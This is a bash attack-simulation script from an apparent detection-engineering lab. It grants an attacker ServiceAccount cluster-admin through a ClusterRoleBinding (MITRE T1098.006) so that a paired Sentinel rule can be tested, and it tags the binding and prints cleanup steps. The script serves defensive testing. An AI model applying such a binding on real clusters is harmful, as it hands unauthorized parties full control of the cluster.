#!/bin/bash
# ============================================================================
# Attack Simulation: ClusterRoleBinding Creation
# MITRE ATT&CK: T1098.006 - Additional Container Cluster Roles
# Run from: kubectl exec -it kubectl -n attacker -- /bin/sh
# ============================================================================
#
# THE ATTACK (and how the bundle fits together):
#   This script performs the T1098.006 technique: an attacker who already has a
#   foothold grants themselves cluster-admin by creating a ClusterRoleBinding that
#   ties their ServiceAccount (attacker/red-team-operator) to the built-in
#   cluster-admin ClusterRole. That is a classic persistence + privilege-escalation
#   move — the binding survives reboots and hands them full control of the cluster.
#
#   ATTACK (this file)  ->  the API server writes a `create clusterrolebindings`
#     event into the AKSAudit log  ->  query.kql detects that event (binding
#     created by a non-system principal)  ->  rule.bicep deploys query.kql as a
#     Sentinel analytics rule that ALERTS on it. test.kql is the CI assertion that
#     the attack actually produced a detectable event.

# set -e = abort the script immediately if any command fails (don't half-apply).
set -e

# Unique binding name per run: a fixed prefix + the current Unix timestamp, so
# repeated runs don't collide and cleanup/tests can target this specific object.
BINDING_NAME="adversary-lab-test-crb-$(date +%s)"

echo "[*] Creating ClusterRoleBinding: $BINDING_NAME"
echo "[*] This binds the attacker's red-team-operator SA to cluster-admin"
echo ""

# Pipe a here-document (the YAML between <<EOF and EOF) into `kubectl apply` — this
# is the actual malicious API call the detection is built to catch.
cat <<EOF | kubectl apply -f -
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRoleBinding                 # cluster-scoped RBAC grant (not namespaced)
metadata:
  name: $BINDING_NAME
  # Labels/annotations exist only to mark this as lab-generated and safe to delete;
  # they have no bearing on the grant itself. A real attacker would not tag their work.
  labels:
    adversary-lab/test: "T1098.006"
    adversary-lab/cleanup: "true"
  annotations:
    adversary-lab/mitre: "T1098.006"
    adversary-lab/warning: "Created by attack simulation - safe to delete"
subjects:                                # WHO gets the permissions...
  - kind: ServiceAccount
    name: red-team-operator              # the attacker-controlled SA
    namespace: attacker
roleRef:                                 # ...and WHAT permissions they receive
  kind: ClusterRole
  name: cluster-admin                    # the built-in god-mode role = full cluster control
  apiGroup: rbac.authorization.k8s.io
EOF

echo ""
echo "[*] ClusterRoleBinding created: $BINDING_NAME"
# These echoes double as documentation of the expected detection path: the binding
# lands in AKSAudit, where query.kql / the Sentinel rule should fire on it.
echo "[*] Expected detection: T1098.006 - RBAC Binding Created by Non-System Principal"
echo "[*] Expected log table: AKSAudit"
echo ""
echo "[!] To clean up after testing:"
echo "    kubectl delete clusterrolebinding $BINDING_NAME"

# Write the generated binding name to a well-known file so the CI test harness
# (which runs test.kql) knows exactly which object to assert on.
echo "$BINDING_NAME" > /tmp/attack-binding-name.txt
